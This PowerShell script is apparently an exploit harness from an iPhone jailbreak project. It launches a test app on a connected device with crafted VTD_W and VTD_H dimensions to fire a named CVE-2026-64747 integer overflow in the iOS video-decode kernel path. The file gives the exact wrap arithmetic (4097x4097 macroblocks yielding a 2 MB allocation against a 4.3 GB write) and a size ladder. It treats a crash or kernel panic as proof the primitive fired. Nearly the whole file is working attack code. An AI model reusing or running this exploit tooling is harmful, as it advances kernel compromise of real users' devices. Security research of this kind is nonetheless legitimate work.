# o_c_fire_vtd.ps1 - O-D: fire the CVE-2026-64747 decode-side kernel leg.
#
# Launches VTDECPURE with the VTD_* env knobs, pulls Documents/vtdec_report.txt,
# checks the device between rounds. The chosen wrap candidate: 4097x4097 MBs
# (65552^2 = 4,297,064,704 exact -> 2,097,408 in 32-bit -> 2 MB alloc vs 4.3 GB
# write). A round that ends with NO REPORT = the process died mid-run = the
# primitive fired. A reboot = also a result. Read the report tail, not hope.
#
# Run:  powershell -NoProfile -ExecutionPolicy Bypass -File o_c_fire_vtd.ps1 [-Ladder]
param([switch]$Ladder)
$ErrorActionPreference = 'Continue'
$wd    = "G:\op lab\iphone-control\jailbreak"
$ios   = "G:\op lab\arsenal\ios-mirror\bin\ios.exe"
$bid   = "com.lab.lpe.2BGBD62KA3"
$out   = "$wd\.o_c\fire_vtd_results.txt"
$rep   = "$wd\.o_c\fire_vtd_report.txt"

if (Test-Path $out) { Remove-Item $out }

# round list: default = the single chosen wrap candidate; -Ladder = sweep
$rounds = @(@{ w = 4097; h = 4097 })
if ($Ladder) {
    $rounds = @(
        @{ w = 4097; h = 4097 },   # wrap -> small positive (the candidate)
        @{ w = 4096; h = 4096 },   # wrap -> zero size (control: expect clean refusal)
        @{ w = 4098; h = 4098 },   # wrap -> ~4 MB (2x the alloc deficit)
        @{ w = 2049; h = 4097 }    # negative -> caught by the tbnz check (control)
    )
}

foreach ($r in $rounds) {
    $tag = "VTD $($r.w)x$($r.h)"
    Write-Host "=== firing $tag ==="
    & $ios file pull --app=$bid --remote="Documents/vtdec_report.txt" --local="$wd\.o_c\vtd_pre.txt" *> $null
    pymobiledevice3 developer dvt launch --env "VTD_W=$($r.w)" --env "VTD_H=$($r.h)" $bid 2>&1 |
        Select-String -Pattern "launched|Error" | Select-Object -First 2 | ForEach-Object { $_.Line }
    Start-Sleep -Seconds 9
    if (Test-Path $rep) { Remove-Item $rep }
    & $ios file pull --app=$bid --remote="Documents/vtdec_report.txt" --local=$rep *> $null
    if (Test-Path $rep) {
        $txt = [Text.Encoding]::UTF8.GetString([IO.File]::ReadAllBytes($rep))
        Add-Content -LiteralPath $out -Value "--- $tag ---`n$txt" -Encoding UTF8
        $tail = ($txt -split "`n" | Select-Object -Last 5) -join " | "
        Write-Host "    report tail: $tail"
    } else {
        Add-Content -LiteralPath $out -Value "--- $tag --- NO REPORT (the process died mid-run)" -Encoding UTF8
        Write-Host "    NO REPORT - the process died on this round (primitive?)"
    }
    $alive = (& $ios info 2>&1 | Select-String -Pattern "ProductVersion" | Select-Object -First 1)
    if (-not $alive) { Write-Host "    DEVICE GONE (kernel panic = primitive PROVEN, wait for reboot) - stopping"; break }
}

Write-Host ""
Write-Host "=== crash store (newest 3) ==="
& $ios crash ls 2>&1 | Select-String -Pattern "VTDEC|AppleAVE" | Select-Object -First 3
Write-Host ""
Write-Host "=== results in $out ==="
Get-Content $out -ErrorAction SilentlyContinue | Select-Object -Last 40
